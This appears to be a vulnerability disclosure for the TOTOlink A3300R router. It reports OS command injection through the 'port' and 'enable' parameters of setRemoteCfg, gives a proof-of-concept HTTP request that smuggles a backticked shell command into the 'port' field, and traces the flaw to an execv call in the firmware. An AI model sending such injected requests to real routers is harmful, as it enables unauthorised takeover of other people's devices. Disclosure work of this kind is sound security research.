# TOTOlink A3300R V17.0.0cu.557_B20221024 Command Injection

## Product Information

Device: TOTOlink A3300R
Firmware Version: V17.0.0cu.557_B20221024
Manufacturer's website information：https://www.totolink.net/
Firmware download address ：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

![image-20240109124617070](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/7/img/image-20240109124617070.png)

## Vulnerability Description

When deal with  `setRemoteCfg` request,`port`or`enable` parameter is vulnerable to OS command injection.

### POC

```
POST /cgi-bin/cstecgi.cgi?token=C6F41C563E86A379 HTTP/1.1
Host: 192.168.0.1
Content-Length: 75
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/advance/remote.html?token=C6F41C563E86A379
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: uid=eER8ohUW; PrivateKey=73756ACCDA18C09131DFDF6F7C5AA16B; timeout=2
Connection: close

{"port":"12345`ls>/web/cmdi14.txt`","enable":"1","topicurl":"setRemoteCfg"}
```

injection the command "ls>/web/cmdi14.txt"

![image-20240119142904601](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/14/img/image-20240119142904601.png)

check the result.

```
GET /cmdi14.txt HTTP/1.1
Host: itotolink.net
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

```

![image-20240119142908802](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/14/img/image-20240119142908802.png)

## Analysis

sub_4141F8 will handle the `setRemoteCfg` request. sub_4141F8 get `port` parameter from request body, then pass to `Uci_Set_Str` function.

![image-20240119143009692](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/14/img/image-20240119143009692.png)

`Uci_Set_Str` function Splicing uci command, and pass to `CsteSystem` function.

![image-20240109131204077](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/8/img/image-20240109131204077.png)

`CsteSystem` wraps the command and then passes it to `execv` to execute the command.

![image-20240109131330610](https://github.com/funny-mud-peee/IoT-vuls/blob/main/TOTOLINK%20A3300R/8/img/image-20240109131330610.png)

